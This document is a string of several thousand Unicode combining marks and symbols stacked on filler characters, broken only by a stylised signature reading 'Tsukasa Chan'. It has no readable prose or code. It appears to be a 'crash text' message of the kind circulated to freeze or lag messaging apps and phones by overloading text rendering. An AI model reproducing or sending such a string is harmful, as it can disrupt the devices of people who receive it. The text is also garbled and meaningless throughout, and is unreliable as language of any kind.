⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ✘͢͢ۦོ͢⇣͢✰͢↬✘͢͢ۦོ͢⇣͢✰͢↬❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢𓊑𓀦𓀗𓀦𓀗𓊑ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚